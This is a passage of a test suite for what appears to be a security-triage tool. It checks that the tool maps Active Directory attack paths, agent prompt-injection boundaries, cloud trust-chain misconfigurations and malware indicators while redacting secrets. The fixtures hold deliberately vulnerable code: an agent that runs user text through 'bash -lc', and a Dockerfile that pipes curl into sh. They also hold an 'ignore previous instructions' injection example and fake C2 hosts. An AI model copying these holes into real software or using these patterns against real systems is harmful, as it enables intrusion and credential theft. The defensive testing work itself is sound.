		expect(report.target.representativePath).toContain("ntds.dit");
		expect(report.commands.map((row) => row.id)).toContain("windows-ad-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("windows-ad-attack-paths");
		expect(report.commands.map((row) => row.id)).toContain("windows-ad-triage-plan-artifact");
		expect(report.summary.anchors).toContain("Windows/AD identity anchors");
		expect(report.summary.missingCritical).not.toContain("evtx_dump.py");
		expect(report.nextQueue.some((command) => command.includes("windows-ad-quicklook.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("windows-ad-attack-paths.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("windows-ad-triage-plan.sh"))).toBe(true);
		const summaryPath = join(report.artifactDir, "windows-ad-quicklook.json");
		const attackPathsPath = join(report.artifactDir, "windows-ad-attack-paths.json");
		const planPath = join(report.artifactDir, "windows-ad-triage-plan.sh");
		expect(existsSync(summaryPath)).toBe(true);
		expect(existsSync(attackPathsPath)).toBe(true);
		expect(existsSync(planPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		expect(statSync(attackPathsPath).mode & 0o777).toBe(0o600);
		expect(statSync(planPath).mode & 0o777).toBe(0o700);
		const summary = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			files: Array<{ name: string; type: string }>;
			signals: {
				domains: Array<{ text: string }>;
				principals: Array<{ text: string }>;
				credentials: Array<{ text: string }>;
				kerberos: Array<{ text: string }>;
				adcs: Array<{ text: string }>;
				events: Array<{ text: string }>;
				commands: Array<{ text: string }>;
			};
			bloodhound: {
				fileCount: number;
				relationCounts: Record<string, number>;
				highValue: Array<{ name: string; type: string; highValue: boolean }>;
				owned: Array<{ name: string; owned: boolean }>;
				privilegeEdges: Array<{ source: string; relationship: string; target: string }>;
				attackPaths: Array<{ source: string; target: string; relationships: string[]; proofReady: boolean }>;
				risks: string[];
			};
			risks: string[];
		};
		const attackPaths = JSON.parse(readFileSync(attackPathsPath, "utf8")) as {
			proofReady: boolean;
			attackPaths: Array<{
				source: string;
				target: string;
				relationships: string[];
				evidence: { edgeCount: number };
			}>;
			claimLedger: Array<{ verdict: string; sourceBinding: { source: string; target: string; files: string[] } }>;
			promotionReport: { promotedClaims: unknown[] };
			repairQueue: unknown[];
		};
		expect(JSON.stringify(summary)).not.toContain(secret);
		expect(JSON.stringify(attackPaths)).not.toContain(secret);
		expect(summary.files.map((file) => file.type)).toEqual(
			expect.arrayContaining(["ntds", "registry-hive", "evtx", "kirbi"]),
		);
		expect(summary.risks).toEqual(
			expect.arrayContaining([
				"credential-material-signal",
				"kerberos-attack-surface",
				"adcs-attack-surface",
				"windows-event-log-signal",
				"offensive-tool-or-suspicious-command-signal",
				"offline-domain-credential-dump-surface",
				"bloodhound-graph-data-present",
				"bloodhound-high-value-node-signal",
				"bloodhound-owned-principal-signal",
				"bloodhound-privilege-edge-signal",
				"bloodhound-owned-principal-edge-signal",
				"bloodhound-owned-to-high-value-path-signal",
			]),
		);
		expect(report.summary.anchors).toContain("BloodHound graph anchors");
		expect(report.nextQueue.some((command) => command.toLowerCase().includes("bloodhound"))).toBe(true);
		expect(summary.bloodhound.fileCount).toBeGreaterThanOrEqual(2);
		expect(summary.bloodhound.relationCounts.MemberOf).toBeGreaterThanOrEqual(1);
		expect(summary.bloodhound.relationCounts.GenericAll).toBe(1);
		expect(summary.bloodhound.highValue.some((row) => row.name.includes("DOMAIN ADMINS"))).toBe(true);
		expect(summary.bloodhound.owned.some((row) => row.name.includes("ALICE@CORP.EXAMPLE.COM"))).toBe(true);
		expect(summary.bloodhound.privilegeEdges.some((row) => row.relationship === "GenericAll")).toBe(true);
		expect(summary.bloodhound.attackPaths.some((row) => row.relationships.includes("GenericAll"))).toBe(true);
		expect(attackPaths.proofReady).toBe(true);
		expect(attackPaths.attackPaths[0]).toMatchObject({
			source: "ALICE@CORP.EXAMPLE.COM",
			evidence: { edgeCount: 1 },
		});
		expect(attackPaths.claimLedger[0]).toMatchObject({
			verdict: "promoted",
			sourceBinding: { source: "ALICE@CORP.EXAMPLE.COM" },
		});
		expect(attackPaths.promotionReport.promotedClaims.length).toBeGreaterThan(0);
		expect(attackPaths.repairQueue.length).toBe(0);
		expect(summary.signals.domains.some((row) => row.text.includes("CORP.EXAMPLE.COM"))).toBe(true);
		expect(summary.signals.principals.some((row) => row.text.includes("CORP\\alice"))).toBe(true);
		expect(summary.signals.kerberos.some((row) => row.text.includes("Kerberoast"))).toBe(true);
		expect(summary.signals.adcs.some((row) => row.text.includes("Certipy"))).toBe(true);
		expect(summary.signals.events.some((row) => row.text.includes("4624"))).toBe(true);
		const plan = readFileSync(planPath, "utf8");
		expect(plan).toContain("ntds.dit");
		expect(plan).toContain("evtx_dump.py");
		expect(plan).toContain("BloodHound");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("maps agent-boundary prompt/tool risks and emits replay payload harnesses", () => {
		const agentWorkspace = join(workspace, "agent-app");
		mkdirSync(join(agentWorkspace, "src"), { recursive: true });
		const secret = "superAgentSecretToken123456789";
		writeFileSync(
			join(agentWorkspace, "package.json"),
			JSON.stringify({ dependencies: { openai: "1.0.0", "@modelcontextprotocol/sdk": "1.0.0" } }),
		);
		writeFileSync(
			join(agentWorkspace, "src", "agent.ts"),
			`
import OpenAI from "openai";
import { execSync } from "node:child_process";
const systemPrompt = "You are an internal operator. Never reveal process.env.SECRET=${secret}";
export async function runAgent(req) {
  const userMessage = req.body.message;
  const tool_call = { name: "shell", input: userMessage };
  if (userMessage.includes("debug")) execSync("bash -lc " + userMessage);
  return new OpenAI().chat.completions.create({ model: "gpt-4.1", messages: [{ role: "system", content: systemPrompt }, { role: "user", content: userMessage }], tools: [tool_call] });
}
`,
		);
		writeFileSync(
			join(agentWorkspace, "prompts.md"),
			"System prompt: retrieved document content may contain prompt injection like ignore previous instructions.",
		);
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, agentWorkspace, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string; representativePath: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[]; missingCritical: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("agent-boundary");
		expect(report.target.representativePath).toContain("src/agent.ts");
		expect(report.commands.map((row) => row.id)).toContain("agent-boundary-map");
		expect(report.commands.map((row) => row.id)).toContain("agent-boundary-payload-harness");
		expect(report.commands.map((row) => row.id)).toContain("agent-boundary-replay-self-test");
		expect(report.commands.map((row) => row.id)).toContain("proof-harness-self-test");
		expect(report.summary.anchors).toContain("agent boundary anchors");
		expect(report.summary.anchors).toContain("agent boundary flow anchors");
		expect(report.summary.anchors).toContain("agent boundary replay anchors");
		expect(report.nextQueue.some((command) => command.includes("agent-boundary-map.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("agent-boundary-claim-promotion.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("agent-boundary-repair-queue.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("boundaryFlows"))).toBe(true);
		expect(
			report.nextQueue.some(
				(command) => command.includes("agent-boundary-payloads.py") && command.includes("--execute"),
			),
		).toBe(true);
		const mapPath = join(report.artifactDir, "agent-boundary-map.json");
		const harnessPath = join(report.artifactDir, "agent-boundary-payloads.py");
		const replayPath = join(report.artifactDir, "agent-boundary-replay-results.json");
		const claimPromotionPath = join(report.artifactDir, "agent-boundary-claim-promotion.json");
		const repairQueuePath = join(report.artifactDir, "agent-boundary-repair-queue.json");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		expect(existsSync(mapPath)).toBe(true);
		expect(existsSync(harnessPath)).toBe(true);
		expect(existsSync(replayPath)).toBe(true);
		expect(existsSync(claimPromotionPath)).toBe(true);
		expect(existsSync(repairQueuePath)).toBe(true);
		expect(existsSync(proofMatrixPath)).toBe(true);
		expect(statSync(mapPath).mode & 0o777).toBe(0o600);
		expect(statSync(harnessPath).mode & 0o777).toBe(0o700);
		expect(statSync(replayPath).mode & 0o777).toBe(0o600);
		expect(statSync(claimPromotionPath).mode & 0o777).toBe(0o600);
		expect(statSync(repairQueuePath).mode & 0o777).toBe(0o600);
		const map = JSON.parse(readFileSync(mapPath, "utf8")) as {
			risks: string[];
			categories: Record<string, number>;
			boundaryFlows: Array<{
				file: string;
				type: string;
				source: string;
				sink: string;
				severity: string;
				payloadIds: string[];
				evidence: Array<{ category: string; snippet: string }>;
			}>;
			findings: Array<{ category: string; snippet: string }>;
		};
		expect(JSON.stringify(map)).not.toContain(secret);
		expect(map.risks).toEqual(
			expect.arrayContaining([
				"prompt-injection-boundary",
				"llm-to-shell-tool-boundary",
				"tool-secret-exfiltration-boundary",
				"untrusted-input-to-tool-boundary",
				"untrusted-input-to-shell-execution-flow",
				"llm-to-shell-execution-flow",
				"tool-secret-exfiltration-flow",
				"prompt-injection-evidence-flow",
			]),
		);
		expect(map.categories["llm-client"]).toBeGreaterThan(0);
		expect(map.boundaryFlows.map((flow) => flow.type)).toEqual(
			expect.arrayContaining([
				"untrusted-input-to-shell-execution",
				"llm-to-shell-execution-boundary",
				"tool-secret-exfiltration-boundary",
				"prompt-injection-evidence-boundary",
			]),
		);
		expect(
			map.boundaryFlows.some(
				(flow) => flow.severity === "critical" && flow.payloadIds.includes("tool-arg-shell-metacharacters"),
			),
		).toBe(true);
		expect(map.findings.some((finding) => finding.category === "tool-execution")).toBe(true);
		const replay = JSON.parse(readFileSync(replayPath, "utf8")) as {
			proofReady: boolean;
			rows: Array<{ payloadId: string; status: number; responseSha256: string; signals: string[] }>;
			promotionReport: {
				promotedClaims: Array<{ verdict: string; evidenceBinding: { responseSha256: string; signals: string[] } }>;
			};
			claimLedger: Array<{ verdict: string; sourceBinding: { boundaryFlows: unknown[] } }>;
			repairQueue: Array<{ blocker: string }>;
		};
		const claimPromotion = JSON.parse(readFileSync(claimPromotionPath, "utf8")) as {
			proofReady: boolean;
			claimLedger: Array<{ verdict: string; payloadId: string }>;
		};
		const repairQueue = JSON.parse(readFileSync(repairQueuePath, "utf8")) as {
			queue: Array<{ blocker: string; rerunCommand: string }>;
		};
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
			liveChecks: Array<{ id: string }>;
		};
		expect(replay.proofReady).toBe(true);
		expect(replay.rows.map((row) => row.payloadId)).toContain("secret-exfiltration-policy");
		expect(replay.promotionReport.promotedClaims.some((claim) => claim.verdict === "unsafe-promoted")).toBe(true);
		expect(replay.promotionReport.promotedClaims[0].evidenceBinding.responseSha256).toMatch(/^[a-f0-9]{64}$/);
		expect(replay.claimLedger.some((claim) => claim.sourceBinding.boundaryFlows.length > 0)).toBe(true);
		expect(replay.repairQueue.map((row) => row.blocker)).toContain("no-boundary-differential");
		expect(claimPromotion.proofReady).toBe(true);
		expect(claimPromotion.claimLedger.some((claim) => claim.verdict === "control-promoted")).toBe(true);
		expect(repairQueue.queue[0].rerunCommand).toContain("agent-boundary-payloads.py");
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("agent-boundary-replay-results.json");
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("agent-boundary-claim-promotion.json");
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("agent-boundary-repair-queue.json");
		expect(proofMatrix.liveChecks.map((row) => row.id)).toContain("agent-boundary-payloads-self-test");
		const harness = spawnSync("python3", [harnessPath, "--self-test"], {
			encoding: "utf8",
			timeout: 15_000,
		});
		expect(harness.status, `${harness.stderr}\n${harness.stdout}`).toBe(0);
		expect(harness.stdout).toContain("repi-agent-boundary-replay-results");
		expect(harness.stdout).toContain("unsafe-promoted");
		expect(harness.stdout).toContain("ssrf-url-tool");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("maps cloud identity and deployment trust chains with redacted evidence", () => {
		const cloudWorkspace = join(workspace, "cloud-stack");
		mkdirSync(join(cloudWorkspace, "k8s"), { recursive: true });
		mkdirSync(join(cloudWorkspace, ".github", "workflows"), { recursive: true });
		const secret = "superCloudSecretToken123456789";
		writeFileSync(
			join(cloudWorkspace, "main.tf"),
			`
provider "aws" { region = "us-east-1" }
resource "aws_iam_role" "deploy" { name = "deploy-role" }
resource "aws_iam_policy" "admin" { policy = jsonencode({ Statement = [{ Effect = "Allow", Action = "*", Resource = "*" }] }) }
variable "client_secret" { default = "${secret}" }
resource "aws_security_group_rule" "public" { cidr_blocks = ["0.0.0.0/0"] }
`,
		);
		writeFileSync(
			join(cloudWorkspace, "k8s", "deploy.yaml"),
			`
apiVersion: apps/v1
kind: Deployment
metadata: { name: api }
spec:
  template:
    spec:
      serviceAccountName: admin
      hostNetwork: true
      containers:
        - name: api
          image: ghcr.io/demo/api:latest
          securityContext:
            privileged: true
          env:
            - name: AWS_ACCESS_KEY_ID
              value: AKIAIOSFODNN7EXAMPLE
            - name: PASSWORD
              valueFrom:
                secretKeyRef: { name: api-secret, key: password }
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: admin-binding }
roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
`,
		);
		writeFileSync(
			join(cloudWorkspace, "Dockerfile"),
			"FROM node:22\nUSER root\nRUN curl https://example.test/install.sh | sh\nEXPOSE 8080\n",
		);
		writeFileSync(
			join(cloudWorkspace, ".github", "workflows", "deploy.yml"),
			`
permissions:
  id-token: write
  contents: read
on: pull_request_target
jobs:
  deploy:
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy
      - run: echo "${secret}"
`,
		);
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, cloudWorkspace, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[]; missingCritical: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("cloud-identity");
		expect(report.commands.map((row) => row.id)).toContain("cloud-identity-map");
		expect(report.commands.map((row) => row.id)).toContain("cloud-identity-trust-claims");
		expect(report.commands.map((row) => row.id)).toContain("cloud-identity-verify-artifact");
		expect(report.summary.anchors).toContain("cloud identity anchors");
		expect(report.summary.anchors).toContain("cloud trust-chain anchors");
		expect(report.summary.missingCritical).not.toContain("terraform");
		expect(report.nextQueue.some((command) => command.includes("cloud-identity-map.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("cloud-identity-trust-claims.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("cloud-identity-verify.sh"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("claimLedger"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("trustChains"))).toBe(true);
		const mapPath = join(report.artifactDir, "cloud-identity-map.json");
		const trustClaimsPath = join(report.artifactDir, "cloud-identity-trust-claims.json");
		const verifyPath = join(report.artifactDir, "cloud-identity-verify.sh");
		expect(existsSync(mapPath)).toBe(true);
		expect(existsSync(trustClaimsPath)).toBe(true);
		expect(existsSync(verifyPath)).toBe(true);
		expect(statSync(mapPath).mode & 0o777).toBe(0o600);
		expect(statSync(trustClaimsPath).mode & 0o777).toBe(0o600);
		expect(statSync(verifyPath).mode & 0o777).toBe(0o700);
		const map = JSON.parse(readFileSync(mapPath, "utf8")) as {
			risks: string[];
			categories: Record<string, number>;
			trustChains: {
				githubOidc: Array<{ role: string; idToken: boolean; pullRequestTarget: boolean; risk: string }>;
				terraformIam: Array<{ resourceType: string; name: string; wildcard: boolean }>;
				kubernetes: Array<{
					kind: string;
					serviceAccount?: string | null;
					name?: string | null;
					privileged: boolean;
					hostNetwork: boolean;
					clusterAdmin?: boolean;
				}>;
				containers: Array<{ rootUser: boolean; curlPipe: boolean; exposed: string[] }>;
			};
			findings: Array<{ category: string; snippet: string }>;
		};
		expect(JSON.stringify(map)).not.toContain(secret);
		expect(JSON.stringify(map)).not.toContain("AKIAIOSFODNN7EXAMPLE");
		const trustClaims = JSON.parse(readFileSync(trustClaimsPath, "utf8")) as {
			proofReady: boolean;
			claimLedger: Array<{
				claimType: string;
				verdict: string;
				sourceBinding: Record<string, unknown>;
				evidenceBinding: Record<string, unknown>;
				blockers: string[];
			}>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }>; blockers: string[] };
			repairQueue: Array<{ blocker: string; action: string }>;
		};
		expect(JSON.stringify(trustClaims)).not.toContain(secret);
		expect(JSON.stringify(trustClaims)).not.toContain("AKIAIOSFODNN7EXAMPLE");
		expect(trustClaims.proofReady).toBe(true);
		expect(
			trustClaims.claimLedger.some(
				(claim) => claim.claimType === "github-oidc-pull-request-target" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			trustClaims.claimLedger.some(
				(claim) => claim.claimType === "terraform-wildcard-iam-policy" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			trustClaims.claimLedger.some(
				(claim) =>
					(claim.claimType === "kubernetes-privileged-service-account" ||
						claim.claimType === "kubernetes-cluster-admin-binding") &&
					claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			trustClaims.claimLedger.some(
				(claim) => claim.claimType === "cloud-trust-chain-pivot" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(trustClaims.composedPaths.some((claim) => claim.claimType === "cloud-trust-chain-pivot")).toBe(true);
		expect(
			trustClaims.promotionReport.promotedClaims.some((claim) => claim.claimType === "cloud-trust-chain-pivot"),
		).toBe(true);
		expect(trustClaims.repairQueue.some((row) => row.blocker === "missing-oidc-role")).toBe(false);
		expect(map.risks).toEqual(
			expect.arrayContaining([
				"secret-or-credential-surface",
				"iam-privilege-surface",
				"public-network-exposure",
				"container-breakout-or-root-risk",
				"ci-oidc-deployment-trust-chain",
				"terraform-identity-control-plane",
				"github-oidc-role-assumption-signal",
				"github-oidc-pull-request-target-signal",
				"terraform-wildcard-iam-policy-signal",
				"kubernetes-clusterrolebinding-signal",
				"kubernetes-privileged-service-account-signal",
				"container-build-runtime-risk-signal",
			]),
		);
		expect(map.categories["terraform-provider"]).toBeGreaterThan(0);
		expect(map.categories["iam-surface"]).toBeGreaterThan(0);
		expect(map.findings.some((finding) => finding.category === "ci-oidc")).toBe(true);
		expect(map.trustChains.githubOidc[0]).toMatchObject({
			role: "arn:aws:iam::123456789012:role/deploy",
			idToken: true,
			pullRequestTarget: true,
			risk: "oidc-from-pull-request-target",
		});
		expect(map.trustChains.terraformIam.some((row) => row.resourceType === "aws_iam_policy" && row.wildcard)).toBe(
			true,
		);
		expect(
			map.trustChains.kubernetes.some((row) => row.serviceAccount === "admin" && row.privileged && row.hostNetwork),
		).toBe(true);
		expect(map.trustChains.kubernetes.some((row) => row.kind === "ClusterRoleBinding" && row.clusterAdmin)).toBe(
			true,
		);
		expect(map.trustChains.containers.some((row) => row.rootUser && row.curlPipe)).toBe(true);
		const verify = readFileSync(verifyPath, "utf8");
		expect(verify).toContain("terraform validate");
		expect(verify).toContain("kubectl apply --dry-run=client");
		expect(verify).toContain("high-risk-grep.txt");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		expect(existsSync(proofMatrixPath)).toBe(true);
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
		};
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("cloud-identity-trust-claims.json");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes malware samples into IOC and capability evidence", () => {
		const secret = "superMalwareSecretToken123456789";
		const sampleTarget = join(workspace, "malware-sample.bin");
		writeFileSync(
			sampleTarget,
			Buffer.concat([
				minimalPe64ImportSample(),
				Buffer.from(
					[
						`https://c2.example.com/panel?access_token=${secret}`,
						`Authorization: Bearer ${secret}`,
						"CreateRemoteThread VirtualAlloc WriteProcessMemory",
						"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
						"mutex Global\\repi-test User-Agent Mozilla/5.0 beacon sleep=60",
						"UPX IsDebuggerPresent anti-sandbox",
						"capa ATT&CK T1055 Process Injection",
						"FLOSS decoded-string YARA Pi_RECON_Suspicious_Strings",
					].join("\0"),
				),
			]),
		);
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, sampleTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[]; missingCritical: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("malware");
		expect(report.commands.map((row) => row.id)).toContain("malware-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("malware-behavior-claims");
		expect(report.commands.map((row) => row.id)).toContain("malware-triage-plan-artifact");
		expect(report.summary.anchors).toContain("malware IOC/capability anchors");
		expect(report.summary.missingCritical).not.toContain("strings");
		expect(report.nextQueue.some((command) => command.includes("malware-quicklook.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("malware-behavior-claims.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("claimLedger"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("malware-triage-plan.sh"))).toBe(true);
		const summaryPath = join(report.artifactDir, "malware-quicklook.json");
		const behaviorClaimsPath = join(report.artifactDir, "malware-behavior-claims.json");
		const planPath = join(report.artifactDir, "malware-triage-plan.sh");
		expect(existsSync(summaryPath)).toBe(true);
		expect(existsSync(behaviorClaimsPath)).toBe(true);
		expect(existsSync(planPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		expect(statSync(behaviorClaimsPath).mode & 0o777).toBe(0o600);
		expect(statSync(planPath).mode & 0o777).toBe(0o700);
		const summary = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			files: Array<{
				name: string;
				format: string;
				staticStructure: {
					format: string;
					pe: { machine: string; entryRva: string };
					sections: Array<{ name: string; executable: boolean; writable: boolean }>;
					suspiciousImports: Array<{ dll: string; name: string }>;
					overlay: { offset: number; size: number; entropy: number };
					risks: string[];
				};
			}>;
			signals: {
				urls: Array<{ text: string }>;
				registryPersistence: Array<{ text: string }>;
				capabilities: Array<{ text: string }>;
				packerEvasion: Array<{ text: string }>;
				configHints: Array<{ text: string }>;
				ruleHits: Array<{ text: string }>;
			};
			risks: string[];
		};
		expect(JSON.stringify(summary)).not.toContain(secret);
		const behaviorClaims = JSON.parse(readFileSync(behaviorClaimsPath, "utf8")) as {
			proofReady: boolean;
			configFields: Array<{ field: string; value: string }>;
			claimLedger: Array<{ claimType: string; verdict: string; evidenceBinding: Record<string, unknown> }>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }> };
			repairQueue: Array<{ blocker: string }>;
		};
		expect(JSON.stringify(behaviorClaims)).not.toContain(secret);
		expect(behaviorClaims.proofReady).toBe(true);
		expect(behaviorClaims.configFields.some((field) => field.field === "mutex")).toBe(true);
		expect(
			behaviorClaims.claimLedger.some(
				(claim) => claim.claimType === "malware-network-url-ioc" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			behaviorClaims.claimLedger.some(
				(claim) => claim.claimType === "malware-persistence-indicator" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			behaviorClaims.claimLedger.some(
				(claim) => claim.claimType === "malware-process-injection-capability" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			behaviorClaims.claimLedger.some(
				(claim) => claim.claimType === "malware-overlay-carve-target" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			behaviorClaims.claimLedger.some(
				(claim) => claim.claimType === "malware-behavior-chain" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			behaviorClaims.promotionReport.promotedClaims.some((claim) => claim.claimType === "malware-behavior-chain"),
		).toBe(true);
		expect(summary.files[0]).toMatchObject({ name: "malware-sample.bin", format: "PE" });
		expect(summary.risks).toEqual(
			expect.arrayContaining([
				"network-ioc-signal",
				"persistence-signal",
				"execution-or-injection-capability-signal",
				"packer-or-evasion-signal",
				"config-or-mutex-signal",
				"rule-or-capability-output-signal",
				"executable-sample-surface",
				"structured-executable-analysis-signal",
				"malware-overlay-signal",
				"malware-suspicious-import-signal",
			]),
		);
		expect(report.summary.anchors).toContain("malware static structure anchors");
		expect(report.nextQueue.some((command) => command.includes("staticStructure"))).toBe(true);
		expect(summary.files[0].staticStructure).toMatchObject({
			format: "PE",
			pe: { machine: "x86-64", entryRva: "0x1000" },
		});
		expect(summary.files[0].staticStructure.sections.map((section) => section.name)).toEqual(
			expect.arrayContaining([".text", ".rdata"]),
		);
		expect(summary.files[0].staticStructure.suspiciousImports.map((row) => row.name)).toEqual(
			expect.arrayContaining(["VirtualAlloc", "CreateRemoteThread"]),
		);
		expect(summary.files[0].staticStructure.overlay).toMatchObject({ offset: 0x800 });
		expect(summary.files[0].staticStructure.risks).toContain("suspicious-import-surface");
		expect(summary.signals.urls.some((row) => row.text.includes("c2.example.com"))).toBe(true);
		expect(summary.signals.registryPersistence.some((row) => row.text.includes("CurrentVersion\\Run"))).toBe(true);
		expect(summary.signals.capabilities.some((row) => row.text.includes("CreateRemoteThread"))).toBe(true);
		expect(summary.signals.packerEvasion.some((row) => row.text.includes("IsDebuggerPresent"))).toBe(true);
		expect(summary.signals.configHints.some((row) => row.text.includes("mutex"))).toBe(true);
		expect(summary.signals.ruleHits.some((row) => row.text.includes("ATT&CK"))).toBe(true);
		const plan = readFileSync(planPath, "utf8");
		expect(plan).toContain("capa");
		expect(plan).toContain("floss");
		expect(plan).toContain("YARA");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		expect(existsSync(proofMatrixPath)).toBe(true);
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
		};
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("malware-behavior-claims.json");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("keeps malware directory quicklook separate from representative sample scans", () => {
		const malwareWorkspace = join(workspace, "malware-case");
		mkdirSync(join(malwareWorkspace, "reports"), { recursive: true });
		const sample = join(malwareWorkspace, "dropper.exe");
		writeFileSync(
			sample,
			Buffer.concat([
				Buffer.from([0x4d, 0x5a, 0x90, 0x00]),
				Buffer.from("http://payload.example.net/c2\0CreateRemoteThread\0mutex Global\\case-dir\0"),
			]),
		);
		writeFileSync(join(malwareWorkspace, "reports", "capa-report.txt"), "capa ATT&CK T1055 Process Injection\n");
		writeFileSync(
			join(malwareWorkspace, "reports", "rule.yara"),
			'rule suspicious_sample { strings: $a = "CreateRemoteThread" condition: $a }\n',
		);
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, malwareWorkspace, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string; representativePath: string };
			commands: Array<{ id: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.target.lane).toBe("malware");
		expect(report.target.representativePath).toBe(sample);
		expect(report.commands.map((row) => row.id)).toContain("malware-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("representative-malware-quicklook");
		expect(report.summary.anchors).toContain("malware IOC/capability anchors");
		expect(report.nextQueue.some((command) => command.includes("malware-quicklook.json"))).toBe(true);
		const summaryPath = join(report.artifactDir, "malware-quicklook.json");
		const representativeSummaryPath = join(report.artifactDir, "representative", "malware-quicklook.json");
		const planPath = join(report.artifactDir, "malware-triage-plan.sh");
		expect(existsSync(summaryPath)).toBe(true);
		expect(existsSync(representativeSummaryPath)).toBe(true);
		const summary = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			files: Array<{ name: string; format: string }>;
			signals: {
				urls: Array<{ text: string }>;
				ruleHits: Array<{ text: string }>;
			};
		};
		expect(summary.files.map((file) => file.name)).toEqual(
			expect.arrayContaining(["dropper.exe", "reports/capa-report.txt", "reports/rule.yara"]),
		);
		expect(summary.signals.urls.some((row) => row.text.includes("payload.example.net"))).toBe(true);
		expect(summary.signals.ruleHits.some((row) => row.text.includes("ATT&CK"))).toBe(true);
		const plan = readFileSync(planPath, "utf8");
		expect(plan).toContain('find "$TARGET" -type f');
		expect(plan).toContain("artifacts.txt");
		expect(plan).toContain("while IFS= read -r sample");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("routes crypto/stego artifacts into transform-chain probes", () => {
		const stegoTarget = join(workspace, "cover.png");
		const secret = "superStegoSecretToken123456789";
		writeFileSync(stegoTarget, minimalPngWithStegoText(secret));
		const result = spawnSync(
			process.execPath,
